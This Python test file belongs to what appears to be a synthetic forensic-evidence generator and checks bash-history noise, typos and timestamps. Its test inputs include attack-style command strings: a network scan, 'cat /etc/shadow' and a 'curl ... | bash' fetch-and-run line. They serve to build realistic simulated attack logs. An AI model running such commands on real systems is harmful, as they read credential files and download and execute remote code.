# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for bash history organic noise and per-user coverage (P0 fix).

Bash history should include organic noise commands between storyline
events, and baseline should generate bash history for all Linux users,
not just the attack user.
"""

from datetime import UTC, datetime, timedelta
from unittest.mock import Mock

import pytest

from evidenceforge.generation.activity.generator import ActivityGenerator
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.scenario import System, User


@pytest.fixture
def state_manager():
    sm = StateManager()
    sm.set_current_time(datetime(2024, 3, 18, 12, 0, 0, tzinfo=UTC))
    return sm


@pytest.fixture
def mock_emitters():
    return {
        "windows_event_security": Mock(),
        "windows_event_sysmon": Mock(),
        "zeek_conn": Mock(),
        "ecar": Mock(),
        "syslog": Mock(),
        "bash_history": Mock(),
    }


@pytest.fixture
def linux_system():
    return System(hostname="WEB-01", ip="10.0.10.1", os="Ubuntu 22.04", type="server")


@pytest.fixture
def root_user():
    return User(
        username="root",
        full_name="Root",
        email="root@system.local",
        enabled=True,
        persona="sysadmin",
    )


@pytest.fixture
def admin_user():
    return User(
        username="deploy",
        full_name="Deploy User",
        email="deploy@company.com",
        enabled=True,
        persona="sysadmin",
    )


# Organic noise command pool — commands that should appear in bash noise
ORGANIC_COMMANDS = {
    "pwd",
    "ls",
    "ls -la",
    "id",
    "w",
    "whoami",
    "uname -a",
    "uptime",
    "df -h",
    "ps aux",
    "free -m",
    "clear",
    "cd /tmp",
    "hostname",
    "hostname -f",
    "ss -tulnp",
    "systemctl status sshd",
}


class TestStorylineBashNoise:
    """Storyline bash commands should include organic noise."""

    def test_storyline_bash_emits_noise_commands(
        self, state_manager, mock_emitters, linux_system, root_user
    ):
        """After a storyline bash command, noise commands should also be emitted."""
        from evidenceforge.generation.engine import GenerationEngine

        engine = object.__new__(GenerationEngine)
        engine.state_manager = state_manager
        engine._system_pids = {}

        pids: dict[str, int] = {}
        engine._seed_linux_process_tree(linux_system, pids)
        engine._system_pids[linux_system.hostname] = pids

        ag = ActivityGenerator(state_manager, mock_emitters)
        ag._system_pids = engine._system_pids

        # Track all bash commands emitted
        emitted_commands: list[str] = []
        original_generate = ag.generate_bash_command

        def tracking_generate(user, system, time, command, **kwargs):
            emitted_commands.append(command)
            return original_generate(user, system, time, command, **kwargs)

        ag.generate_bash_command = tracking_generate

        # Emit a storyline bash command with noise
        ag.generate_bash_command_with_noise(
            root_user,
            linux_system,
            datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC),
            "nmap -sn 10.10.2.0/24",
        )

        # Should have the original command plus some noise
        assert len(emitted_commands) >= 1, "At least the original command should be emitted"
        assert "nmap -sn 10.10.2.0/24" in emitted_commands, "Original command must be present"

        # Over many runs, noise should sometimes be emitted (probabilistic)
        # Run multiple times and check that at least once we get noise
        total_noise = 0
        for _ in range(20):
            emitted_commands.clear()
            ag.generate_bash_command_with_noise(
                root_user,
                linux_system,
                datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC),
                "cat /etc/shadow",
            )
            noise = [c for c in emitted_commands if c != "cat /etc/shadow"]
            total_noise += len(noise)

        assert total_noise > 0, "Expected at least some noise commands across 20 invocations"


class TestBaselineLinuxBashHistory:
    """Baseline should generate bash history for Linux users."""

    def test_generate_bash_command_exists(self, state_manager, mock_emitters, linux_system):
        """ActivityGenerator should have generate_bash_command method."""
        ag = ActivityGenerator(state_manager, mock_emitters)
        assert hasattr(ag, "generate_bash_command"), (
            "ActivityGenerator should have generate_bash_command"
        )

    def test_web_service_process_commands_do_not_write_interactive_bash_history(
        self, state_manager, mock_emitters, linux_system
    ):
        """Noninteractive web daemon children should not appear in bash_history."""
        ag = ActivityGenerator(state_manager, mock_emitters)
        apache = User(
            username="apache",
            full_name="Apache",
            email="apache@system.local",
            enabled=True,
        )

        ag.generate_bash_command(
            apache,
            linux_system,
            datetime(2024, 3, 18, 12, 0, 0, tzinfo=UTC),
            "/bin/bash -c 'curl http://10.0.0.5/s.sh | bash'",
        )

        assert not mock_emitters["bash_history"].emit.called

    def test_bash_command_pools_are_realistic(self):
        """The bash command YAML should contain common admin commands per role."""
        from evidenceforge.generation.activity.bash_commands import load_bash_commands

        commands = load_bash_commands()
        common = commands.get("common", [])
        assert len(common) >= 10, f"Common command pool has only {len(common)} commands"
        pool_str = " ".join(common)
        assert "ls" in pool_str
        assert "df" in pool_str
        assert "ps" in pool_str

        # Role-specific pools should exist and be non-empty
        for role in ("sysadmin", "dba", "webadmin", "developer", "security"):
            pool = commands.get(role, [])
            assert len(pool) >= 5, f"{role} command pool has only {len(pool)} commands"

        # Keyboard adjacency map should exist for generative typos
        adjacency = commands.get("keyboard_adjacency", {})
        assert len(adjacency) >= 20, f"Keyboard adjacency map has only {len(adjacency)} keys"

        typo_model = commands.get("typo_model", {})
        assert 0 <= typo_model.get("max_rate", -1) <= 1
        assert typo_model.get("short_history_max_typos", -1) <= 1

    def test_short_history_typo_cap_suppresses_extra_typos(self, monkeypatch):
        """Short bash histories should not accumulate multiple generated typos."""
        from evidenceforge.generation.activity import bash_commands

        commands = bash_commands.load_bash_commands()
        monkeypatch.setattr(bash_commands, "_typo_rate", lambda _username, _commands: 1.0)

        class TypoRng:
            def random(self):
                return 0.0

            def choice(self, values):
                return values[0]

            def choices(self, values, weights=None, k=1):
                return [values[0] for _ in range(k)]

            def randint(self, lower, _upper):
                return lower

        command, is_typo = bash_commands.pick_bash_command_entry(
            TypoRng(),
            "sysadmin",
            "WEB-01",
            ["nginx"],
            username="deploy",
            session_command_count=commands["typo_model"]["short_history_threshold"],
            prior_typo_count=commands["typo_model"]["short_history_max_typos"],
        )

        assert is_typo is False
        assert command


class TestBashHistoryChronological:
    """Bash history entries should be chronologically sorted."""

    def test_bash_commands_can_be_emitted_out_of_order(
        self, state_manager, mock_emitters, linux_system, root_user
    ):
        """Bash commands emitted with noise offsets should still work."""
        ag = ActivityGenerator(state_manager, mock_emitters)

        # Emit commands at various times
        times = [
            datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC),
            datetime(2024, 3, 18, 13, 59, 55, tzinfo=UTC),  # Before the first
            datetime(2024, 3, 18, 14, 0, 5, tzinfo=UTC),  # After the first
        ]
        for t in times:
            ag.generate_bash_command(root_user, linux_system, t, "ls")

        # No assertion needed — just verify it doesn't crash
        # The emitter sorts entries before writing to disk

    def test_simple_command_dwell_is_not_exact_two_second_cadence(
        self, state_manager, mock_emitters, linux_system, root_user
    ):
        ag = ActivityGenerator(state_manager, mock_emitters)
        start = datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC)

        for offset in (0, 2, 4, 6):
            ag.generate_bash_command(
                root_user, linux_system, start + timedelta(seconds=offset), "ls"
            )

        events = [call.args[0] for call in mock_emitters["bash_history"].emit.call_args_list]
        deltas = [
            (events[idx].timestamp - events[idx - 1].timestamp).total_seconds()
            for idx in range(1, len(events))
        ]

        assert deltas
        assert any(delta != 2.0 for delta in deltas)
